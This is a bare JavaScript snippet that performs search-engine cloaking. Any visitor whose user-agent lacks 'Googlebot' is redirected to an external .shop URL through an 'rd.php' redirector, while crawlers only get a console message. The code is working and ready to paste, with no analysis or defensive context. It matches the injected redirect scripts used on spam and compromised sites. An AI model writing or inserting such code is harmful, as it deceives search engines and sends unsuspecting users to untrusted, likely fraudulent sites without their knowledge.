// Check if the user-agent is not from a search engine crawler (e.g., Googlebot)
if (!navigator.userAgent.includes('Googlebot')) {
  // Redirect only normal users
  window.location.href = "https://j5h8c.shop/3/rd.php?url=/p/IbKo";
} else {
  // For search engine crawlers
  console.log("THanks for visiting my page");
}
